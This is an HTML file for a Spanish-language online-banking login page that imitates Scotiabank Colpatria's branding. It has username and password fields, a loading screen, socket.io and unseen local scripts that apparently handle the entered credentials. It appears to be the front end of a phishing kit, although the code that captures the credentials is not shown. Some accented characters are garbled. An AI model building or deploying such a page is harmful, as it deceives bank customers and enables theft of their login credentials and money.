<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa a tu Banca Virtual</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="/socket.io/socket.io.js"></script>
</head>
<body>
    <div class="container">
        <div class="login-box" id="loginBox">
            <img src="img/scotiabank-colpatria-symbol-red.svg" alt="Scotiabank Colpatria" class="logo">
            
            <h1>Ingresa a tu Banca Virtual</h1>
            
            <form class="login-form" id="loginForm">
                <div class="input-group">
                    <svg class="icon-svg" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#999999"/>
                    </svg>
                    <input type="text" placeholder="Nombre de usuario" class="input-field" id="username" required>
                </div>
                
                <div class="input-group">
                    <svg class="icon-svg" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM15.1 8H8.9V6C8.9 4.29 10.29 2.9 12 2.9C13.71 2.9 15.1 4.29 15.1 6V8Z" fill="#999999"/>
                    </svg>
                    <input type="password" placeholder="Contrase単a" class="input-field" id="password" required>
                </div>
                
                <a href="#" class="forgot-link">多Olvidaste tu usuario o contrase単a?</a>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="remember">
                    <label for="remember">Recordar mi nombre de usuario</label>
                </div>
                
                <button type="button" class="login-button" id="loginBtn" disabled>Ingresar</button>
                
                <div class="signup-section">
                    <span class="signup-text">多Eres nuevo con nosotros?</span>
                    <a href="#" class="signup-link">Activa tu usuario</a>
                </div>
            </form>
        </div>

        <!-- Pantalla de carga -->
        <div class="loading-screen" id="loadingScreen" style="display: none;">
            <img src="img/login-graphic.svg" alt="Cargando" class="loading-graphic">
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="script-optimized.js"></script>
</body>
</html>
